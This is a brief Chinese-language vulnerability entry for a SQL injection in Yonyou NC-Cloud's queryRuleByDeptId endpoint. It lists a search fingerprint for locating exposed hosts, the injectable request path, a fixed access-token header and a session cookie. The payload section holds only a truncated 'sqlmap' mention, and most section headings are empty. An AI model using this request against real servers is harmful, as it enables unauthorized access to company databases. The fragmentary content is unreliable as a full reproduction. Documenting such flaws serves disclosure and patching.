# 用友NC-Cloud系统queryRuleByDeptId存在SQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="用友-NC-Cloud"`
- **请求**：`GET /ncchr/attendcalendar/queryRuleByDeptId?orgId=1 HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`accessTokenNcc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ`　`Cookie: JSESSIONID=E0910A45BE78A1EE9290BA92341968E2.server`

**请求体 / payload**
```

sqlmap\
```

**其他**
- 用友NC-Cloud系统queryRuleByDeptId存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
  * 四、漏洞复现
***
- 版本: * 用友NC Cloud